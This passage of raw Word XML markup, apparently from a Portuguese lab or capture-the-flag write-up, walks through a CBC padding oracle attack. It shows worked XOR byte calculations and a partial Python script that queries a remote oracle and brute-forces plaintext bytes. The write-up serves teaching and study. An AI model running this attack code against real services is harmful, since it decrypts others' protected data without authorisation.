        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x45 = 0xdd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC2DEC5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
        </w:rPr>
        <w:t>Byte 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE90555" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Valor encontrado: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[10] = 0xea</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687E5895" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cálculo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[10] = 0x06 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0xea = 0xec</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521929A3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Plaintext: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">P2[10] = 0x21 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0xec = 0xcc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5F466E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
        </w:rPr>
        <w:t>Resultado parcial</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>0xccddee030303</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241DB93D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Os últimos 3 bytes (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>0x03</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>) representam o padding válido.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23581362" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="244" w:name="automatizaocompython"/>
      <w:bookmarkStart w:id="245" w:name="_Toc213874758"/>
      <w:bookmarkStart w:id="246" w:name="_Toc213881996"/>
      <w:bookmarkEnd w:id="244"/>
      <w:r>
        <w:t>Automatização com Python</w:t>
      </w:r>
      <w:bookmarkEnd w:id="245"/>
      <w:bookmarkEnd w:id="246"/>
    </w:p>
    <w:p w14:paraId="04EC4F40" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Script para automatizar o processo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A90A03" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>#!/usr/bin/python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F20509" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB7EC21" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>from binascii import hexlify, unhexlify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEAA13B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="403815D9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>def xor(first, second):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AAEF43" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    return bytearray(x^y for x,y in zip(first, second))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A9B77B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33F0B0DE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>class PaddingOracle:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BDFD8E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, host, port):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB50050" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD9BABB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s.connect((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DD5E38" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        ciphertext = self.s.recv(4096).decode().strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42744C5B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.ctext = unhexlify(ciphertext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A219E0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FC75F8C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def decrypt(self, ctext: bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA9480B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._send(hexlify(ctext))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3D91BA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self._recv()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780C9490" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15AC4C3B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _recv(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF526EA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.s.recv(4096).decode().strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E28A52" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DE11ED0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _send(self, hexstr: bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20680627" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s.send(hexstr + b'\n')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C0D1EB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D4216B6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __del__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6E2501" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8E4597" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C10B4D4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>def decryptBlock(K, current_padding, CC1, D2, C2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F61656" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    if K &gt; 16:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C3BB9A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        return CC1, D2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E010565" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1838D6AD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(256):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57905C4D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC1[16 - K] = i</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5831CB51" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        status = oracle.decrypt(IV + CC1 + C2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0951B7FF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC1_backup = CC1.copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0C75C0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        D2_backup = D2.copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0DFE7F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FE92D5E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>if status == "Valid":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7E6A2F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t># Descobrimos o byte correto</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBC4A71" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>aux = hex(i)[2:].zfill(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1580A1D4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            D2[16 - K] = int(xor(bytearray.fromhex(current_padding), </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02CCEE27" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                                 bytearray.fromhex(aux)).hex(), base=16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD9011F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="420CC985" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t># Atualizar padding para próxima iteração</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9BDA2E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>current_padding = hex(int(current_padding, base=16) + 1)[2:].zfill(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190E16B1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C894111" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t># Ajustar bytes já descobertos para novo padding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48920EEE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>for x in range(1, K + 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26538D90" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                auxD2 = hex(D2[16 - x])[2:].zfill(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6AA3A1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                CC1[16 - x] = int(xor(bytearray.fromhex(current_padding), </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C143AEC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                                     bytearray.fromhex(auxD2)).hex(), base=16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2524B5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EFE1DB4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>print(f"Encontrado: byte = 0x{i:02x}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C6563D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>print(f"CC1: {CC1.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E71F74" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51AE6EF2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t># Recursão para próximo byte</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE31088" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>CC1, D2 = decryptBlock(K + 1, current_padding, CC1, D2, C2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FE0A59" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>if CC1 != [] and D2 != []:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDFC31C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                return CC1, D2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4CEDA6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
